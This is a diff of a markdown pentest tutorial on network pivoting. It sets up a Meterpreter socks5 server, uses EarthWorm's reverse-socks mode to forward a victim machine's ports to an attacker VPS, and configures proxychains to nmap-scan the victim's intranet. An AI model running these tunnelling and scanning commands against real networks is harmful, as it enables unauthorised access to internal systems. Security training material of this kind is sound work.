@@ -83,9 +83,6 @@ Firstly you can use the socks5 module in meterpreter:
 use anxiliary/server/socks5
 set srvhost 127.0.0.1
 set srvport 1080
-```
-Finally, just run:
-```shell
 run
 ```
 Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine's port to your VPS and use proxy
@@ -103,7 +100,15 @@ ew.exe -s rssocks -d x.x.x.x -e 1024
 ```
 The argument -d is the IP address of your VPS.
 
-If it's Linux in your local machine, you can use proxychains to set the socks5 proxy.                                   Getting proxychains installed:                                                                                          ```shell                                                                                                                apt install proxychains-ng                                                                                              ```                                                                                                                     Add the following content in the /etc/proxychains.conf file:                                                            ```shell                                                                                                                socks5 127.0.0.1 1080                                                                                                   ```
+If it's Linux in your local machine, you can use proxychains to set the socks5 proxy.
+Getting proxychains installed:
+```shell
+apt install proxychains-ng 
+```
+Add the following content in the /etc/proxychains.conf file:
+```shell
+socks5 127.0.0.1 1080
+```
 Then you can use socks proxy to scan the victim's intranet:
 ```shell
 proxychains4 nmap -sT -Pn -open 192.168.100.1/22
